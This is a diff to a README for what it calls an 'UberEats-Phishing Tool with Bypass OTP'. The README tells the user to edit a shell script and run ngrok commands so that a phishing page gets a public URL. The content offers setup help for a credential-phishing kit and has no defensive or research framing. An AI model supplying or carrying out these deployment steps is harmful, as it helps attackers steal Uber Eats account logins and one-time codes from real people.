@@ -2,6 +2,7 @@
 
 Start from here (edit file "./Uber-eats.sh"):
 https://github.com/pols1lver/uber-eats-phishing-fixed/blob/eb5812e3595ab0f4bf09adfac8c556f0ce40a37a/Uber-eats.sh#L62
+
 ```
 Replace this (start from line 62):
 wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
@@ -23,6 +24,9 @@ gnome-terminal -x bash -c "./ngrok config add-authtoken <your_token_here>"
 gnome-terminal -x bash -c "./ngrok http 80; exec bash"
 ```
 
+New console should open with working url.
+
+----
 
 This is UberEats-Phishing Tool with Bypass OTP ! UberEats
 
